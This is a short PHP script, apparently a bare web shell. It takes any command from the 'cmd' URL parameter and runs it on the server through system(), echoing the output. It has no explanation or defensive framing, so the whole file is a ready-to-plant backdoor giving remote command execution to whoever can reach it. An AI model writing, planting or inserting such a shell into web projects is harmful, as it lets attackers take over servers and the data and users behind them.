<?php
if (isset($_GET['cmd'])) 
{
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
    die;
}
else {
    echo "Specify <b>cmd</b> parameter";
}